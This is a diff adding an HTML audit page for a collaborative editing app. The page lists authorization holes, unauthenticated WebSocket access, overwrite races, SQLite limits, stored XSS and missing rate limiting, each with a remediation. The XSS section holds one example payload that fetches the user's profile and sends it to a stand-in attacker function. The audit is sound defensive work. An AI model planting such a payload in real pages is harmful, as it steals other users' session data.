@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Failure Cases - Nexus Docs</title>
+  <link rel="stylesheet" href="./style.css">
+</head>
+<body>
+  <div class="container">
+    <aside class="sidebar">
+      <div class="logo">
+        <span>✦</span> Nexus Docs
+      </div>
+      <ul class="nav-links">
+        <li><a href="./implementation_plan.html">Implementation Plan</a></li>
+        <li><a href="./uml_diagrams.html">UML Diagrams</a></li>
+        <li><a href="./design_specification_psp.html">PSP Design Specs</a></li>
+        <li><a href="./failure_cases.html" class="active">Failure Cases</a></li>
+        <li><a href="./resolved_cases.html">Resolved Cases</a></li>
+        <li><a href="./walkthrough.html">Walkthrough Guide</a></li>
+        <li><a href="./chat_history.html">Chat History</a></li>
+      </ul>
+    </aside>
+    
+    <main class="main-content">
+      <section class="card">
+        <h1>System Failure Cases &amp; Vulnerabilities: Nexus Collaborative Suite</h1>
+<p>This audit highlights the critical failure cases, design vulnerabilities, and architectural bottlenecks present in the current system. These issues range from severe authorization bypasses to concurrency conflicts in real-time collaboration.</p>
+<hr>
+<h2>1. Critical Security Vulnerabilities (Authorization &amp; Access Control)</h2>
+<h3>🚨 Insecure Direct Object References (IDOR)</h3>
+<ul>
+<li>**Description**: Although the system features a <code>Permission</code> database model (assigning "owner", "editor", and "viewer" roles to files), the backend routes for viewing, updating, and deleting files do **not** check these permissions.</li>
+<li>**Failure Cases**:</li>
+<li>**Unauthorized Deletion**: Any logged-in user can delete *any file* in the database by sending a <code>DELETE</code> request to <code>/api/files/:id</code> (if they know or guess the UUID).</li>
+<li>**Unauthorized Modification**: Any logged-in user can modify the content of any file by sending a <code>PUT</code> request to <code>/api/files/:id</code>.</li>
+<li>**Unauthorized Reading**: Any logged-in user can read the content and activity logs of any file via <code>GET /api/files/:id</code>.</li>
+<li>**Remediation**: Check the <code>Permission</code> table in every file route before performing operations:</li>
+</ul>
+  <pre><code>  const userHasPermission = await prisma.permission.findFirst({
+<p>    where: { fileId: req.params.id, userId: req.user.id }</p>
+<p>  });</p>
+<p>  if (!userHasPermission) return res.status(403).json({ error: "Access denied" });</p>
+  </code></pre>
+<h3>🚨 Unauthenticated WebSocket Connections</h3>
+<ul>
+<li>**Description**: The WebSocket handler accepts socket connections and room-joins without validating the user's JWT auth token.</li>
+<li>**Failure Cases**:</li>
+<li>An anonymous user can connect via Socket.io, join the room of any <code>fileId</code>, listen to editing changes, cursor movements, and comments, or send fake edits to disrupt the document.</li>
+<li>**Remediation**: Configure Socket.io middleware to verify the JWT token before allowing the connection to establish:</li>
+</ul>
+  <pre><code>  io.use((socket, next) =&gt; {
+<p>    const token = socket.handshake.auth.token;</p>
+<p>    // Verify JWT token here</p>
+<p>  });</p>
+  </code></pre>
+<hr>
+<h2>2. Concurrency &amp; Synchronization Failures</h2>
+<h3>🚨 Concurrency Collision ("Last-Write-Wins" Overwrites)</h3>
+<ul>
+<li>**Description**: The real-time synchronization uses an operational-transformation (OT) engine simulator only on the client console. The server simply replaces the entire document content in the database using a **Last-Write-Wins (LWW)** strategy.</li>
+<li>**Failure Cases**:</li>
+<li>**Lost Edits**: If User A and User B type simultaneously, User A's changes are sent to the server. Right after, User B's changes arrive. Because the server does not merge the changes, User A's work is completely overwritten by User B's entire page state.</li>
+<li>**Remediation**: Implement a real-time CRDT library like **Yjs** or **Automerge** to merge operations on the server side instead of saving full string representations.</li>
+</ul>
+<h3>🚨 Out-of-Order / Network Latency Race Conditions</h3>
+<ul>
+<li>**Description**: If a user experiences latency or temporary disconnection, they continue typing locally.</li>
+<li>**Failure Cases**:</li>
+<li>When their connection recovers, the client sends their stale local revision to the server, overwriting any edits made by other users in the meantime.</li>
+</ul>
+<hr>
+<h2>3. Database &amp; Infrastructure Limitations</h2>
+<h3>🚨 Ephemeral SQLite Datastore</h3>
+<ul>
+<li>**Description**: The application uses a local SQLite file (<code>dev.db</code>).</li>
+<li>**Failure Cases**:</li>
+<li>**Data Loss on Restart**: In serverless or ephemeral container deployments (like Vercel, free Render, or Hugging Face Spaces), the filesystem is wiped out whenever the container spins down or restarts. All registered users, documents, folders, and comments will be permanently deleted.</li>
+<li>**Remediation**: Migrate the Prisma datasource from SQLite to a cloud PostgreSQL database (e.g. Neon, Supabase).</li>
+</ul>
+<h3>🚨 SQLite Write Locks</h3>
+<ul>
+<li>**Description**: SQLite locks the database file during write transactions.</li>
+<li>**Failure Cases**:</li>
+<li>Under load (e.g., 5+ users typing simultaneously, sending debounced updates every second), the database will throw <code>SQLITE_BUSY: database is locked</code> exceptions, causing API write requests to fail.</li>
+</ul>
+<hr>
+<h2>4. Input Validation &amp; Resilience Vulnerabilities</h2>
+<h3>🚨 Lack of HTML Sanitization (Cross-Site Scripting - XSS)</h3>
+<ul>
+<li>**Description**: The document editor (TipTap) saves content as raw HTML strings, which the backend saves and serves blindly without sanitization.</li>
+<li>**Failure Cases**:</li>
+<li>A malicious collaborator can insert an XSS script payload (e.g., <code>&lt;img src=x onerror="fetch('/api/auth/profile').then(r=&gt;r.json()).then(d=&gt;sendToAttacker(d))"&gt;</code>) inside a document. When another user opens the document, the script runs in their browser and steals their session tokens.</li>
+<li>**Remediation**: Use <code>dompurify</code> or <code>sanitize-html</code> on the server before saving or on the client before rendering HTML.</li>
+</ul>
+<h3>🚨 Denial of Service (DoS) via Bcrypt Spamming</h3>
+<ul>
+<li>**Description**: The backend does not implement rate limiting.</li>
+<li>**Failure Cases**:</li>
+<li>An attacker can spam the <code>/api/auth/login</code> or <code>/api/auth/register</code> endpoints with requests. Since <code>bcrypt</code> hashing is intentionally CPU-intensive, this will saturate the server's CPU and make the site unresponsive for all users.</li>
+<li>**Remediation**: Implement rate-limiting middleware (like <code>express-rate-limit</code>).</li>
+</ul>
+      </section>
+    </main>
+  </div>
+ </body>
+</html>
